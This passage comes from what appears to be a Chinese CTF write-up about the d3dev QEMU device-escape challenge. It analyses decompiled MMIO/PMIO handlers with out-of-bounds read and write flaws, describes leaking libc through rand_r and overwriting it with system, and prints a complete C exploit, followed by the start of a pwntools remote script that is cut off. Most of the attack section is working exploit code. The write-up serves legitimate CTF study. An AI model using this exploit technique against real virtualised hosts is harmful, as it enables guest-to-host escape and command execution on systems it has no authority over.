&#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = 0LL;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pmio-read"><a href="#pmio-read" class="headerlink" title="pmio_read"></a>pmio_read</h4><p>然后再分析pmio_read函数，这个函数朴实无华，功能也十分简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_pmio_read</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(<span class="keyword">void</span> *))((<span class="keyword">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入到dword_7ADF30之后算一下偏移发现是一串gadget，基本上的功能就是读那个设备结构体的一些值，比如seek，key之类的。</p><h4 id="mmio-write"><a href="#mmio-write" class="headerlink" title="mmio_write"></a>mmio_write</h4><p>这个有一个越界写漏洞，出现在设置v4这个index的时候这个seek是我们自主可控的，因此会造成越界写。还有一点需要注意的就是，它那个do while实际上是一个解密的过程。x是低32位，y是高32位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key0; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key1; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key2; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> key3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> x; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> y; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      key0 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      key1 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      key2 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      key3 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      x = v6 + *((_DWORD *)v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      y = ((<span class="keyword">unsigned</span> __int64)v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ (key1 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (key0 + <span class="number">16</span> * y);</span><br><span class="line">        LODWORD(y) = ((i + x) ^ (key3 + (x &gt;&gt; <span class="number">5</span>)) ^ (key2 + <span class="number">16</span> * x)) + y;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i != <span class="number">0xC6EF3720</span> );                <span class="comment">// range(20)</span></span><br><span class="line">      v5[<span class="number">0x15B</span>] = (ObjectClass_0 *)__PAIR64__(y, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mmio-read"><a href="#mmio-read" class="headerlink" title="mmio_read"></a>mmio_read</h4><p>这个地方跟上面的越界写一样，就是个越界读。然后还会把读出的数据进行一个加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *v4; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      v4 = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *v4++ = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>, _QWORD))opaque-&gt;rand_r)(</span><br><span class="line">                  &amp;opaque-&gt;r_seed,</span><br><span class="line">                  <span class="number">28L</span>L,</span><br><span class="line">                  val,</span><br><span class="line">                  *(_QWORD *)&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( v4 != (<span class="keyword">uint32_t</span> *)&amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)opaque-&gt;key = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-利用思路"><a href="#2-3-利用思路" class="headerlink" title="2.3 利用思路"></a>2.3 利用思路</h3><ol><li>利用越界读读出rand_r的地址，算出libc地址</li><li>利用越界写将system地址写入rand_r的位置</li><li>将原来seek的位置以及后面的block写入cat flag命令</li><li>利用pmio_write调用rand_r从而实现命令执行</li></ol><h3 id="2-4-本地调试"><a href="#2-4-本地调试" class="headerlink" title="2.4 本地调试"></a>2.4 本地调试</h3><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.img</span><br></pre></td></tr></table></figure><p>编译写好的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -O0 -o exp -static d3dev.c</span><br></pre></td></tr></table></figure><p>将写好的二进制文件编译后打包入rootfs.img中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><p>然后直接运行它的laungh.sh就行了</p><p>我在20.04的环境下可以直接运行起来,然后<code>ps -ax</code>查看当前有哪些进程，使用gdb attach对应的进程就可以进行相应的调试了</p><blockquote><p>调试时查看结构体可以在d3dev相关函数断点下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;p *((d3devState *)$rdi)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>就可以查看了</p></blockquote><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc040</span>; <span class="comment">//cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span></span><br><span class="line"><span class="keyword">uint32_t</span> keys[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> libc_base ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_arbread</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reset_keys</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> seed = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        keys[i] = rand_r(&amp;seed);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"keys[%d] test = %p\n"</span>,i, keys[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,<span class="number">0</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span> + pmio_base,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_seek_off</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(<span class="number">8</span> + pmio_base,offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">uint32_t</span> x, <span class="keyword">uint64_t</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        i -=<span class="number">0x61C88647</span>;</span><br><span class="line">        x += (i + y) ^ ( ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)y &gt;&gt; <span class="number">5</span>)) ^ (  y &lt;&lt; <span class="number">4</span>);</span><br><span class="line">        y = (<span class="keyword">uint32_t</span>)(((i + x) ^ ((x &gt;&gt; <span class="number">5</span>)) ^ (  x &lt;&lt; <span class="number">4</span>)) + y);</span><br><span class="line">    &#125; <span class="keyword">while</span> (i != <span class="number">0xC6EF3720</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">uint64_t</span> ans = (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ans = %p\n"</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> ans - <span class="number">0x4AEB0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">uint64_t</span> rr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i , x ;</span><br><span class="line">    <span class="keyword">uint64_t</span> y;</span><br><span class="line"></span><br><span class="line">    i  = <span class="number">0xC6EF3720</span>;</span><br><span class="line">    x = rr &amp; <span class="number">0xffffffff</span> ; </span><br><span class="line">    y = rr &gt;&gt; <span class="number">32</span> ;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        y = (<span class="keyword">uint32_t</span>)(y - ((x + i) ^ (x &gt;&gt; <span class="number">5</span>) ^ ( x &lt;&lt; <span class="number">4</span> )));</span><br><span class="line">        x = x - (((y + i) ^ (y &gt;&gt; <span class="number">5</span>) ^ ( y &lt;&lt; <span class="number">4</span> ) )) ;</span><br><span class="line">        i = i + <span class="number">0x61C88647</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"x = %p, y = %p , i = %p\n"</span>,x,y,i);</span><br><span class="line">    <span class="keyword">return</span>  (y &lt;&lt; <span class="number">32</span>) + x;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> tmp2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    tmp = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp test = %p\n"</span>, tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">"I/O permission is not enough"</span>);</span><br><span class="line"></span><br><span class="line">    reset_keys();</span><br><span class="line">    set_seek_off(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// get rand_r </span></span><br><span class="line">    <span class="keyword">uint64_t</span> yy;</span><br><span class="line">    <span class="keyword">uint32_t</span> xx;</span><br><span class="line">    yy = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp1 test = %p\n"</span>, yy); <span class="comment">// part 1</span></span><br><span class="line">    xx = mmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tmp2 test = %p\n"</span>, xx); <span class="comment">// part 2 high</span></span><br><span class="line">    libc_base = decrypt(xx,yy);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"libc_base = %p\n"</span>,libc_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system = libc_base + <span class="number">0x0000000000055410</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"system = %p\n"</span>,system);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system)));</span><br><span class="line">    mmio_write(<span class="number">24</span>, (<span class="keyword">uint32_t</span>)(encrypt(system) &gt;&gt; <span class="number">32</span>));</span><br><span class="line">    <span class="comment">// char sed[4] = "cat ";</span></span><br><span class="line">    <span class="comment">// char flag[8] = "/home/ct";</span></span><br><span class="line">    <span class="comment">// char flag2[8] = "f/flag\x00";</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flag1 = <span class="number">0x20746163</span>; <span class="comment">//"cat "</span></span><br><span class="line">    <span class="keyword">uint64_t</span> flag2 = <span class="number">0x67616c66</span>; <span class="comment">// "flag"</span></span><br><span class="line">    <span class="comment">// uint64_t flag3 = 0x67616c662f66;</span></span><br><span class="line">    set_seek_off(<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2)));</span><br><span class="line">    mmio_write(<span class="number">0</span>, (<span class="keyword">uint32_t</span>)(encrypt(flag2) &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmio_write(8, (uint32_t)(encrypt(flag3)));</span></span><br><span class="line">    <span class="comment">// mmio_write(8, (uint32_t)(encrypt(flag3) &gt;&gt; 32));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span> + pmio_base,flag1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-远程exp"><a href="#0x04-远程exp" class="headerlink" title="0x04 远程exp"></a>0x04 远程exp</h2><p>模板来自[这里]([[Pwn 笔记]Linux Kernel 调试文件总结 | binLep’s Blog](<a href="https://binlep.github.io/2020/03/12/[Pwn" target="_blank" rel="noopener">https://binlep.github.io/2020/03/12/[Pwn</a> 笔记]Linux Kernel 调试文件总结/))</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'/ #'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'gcc -static -O0 ./d3dev.c -o 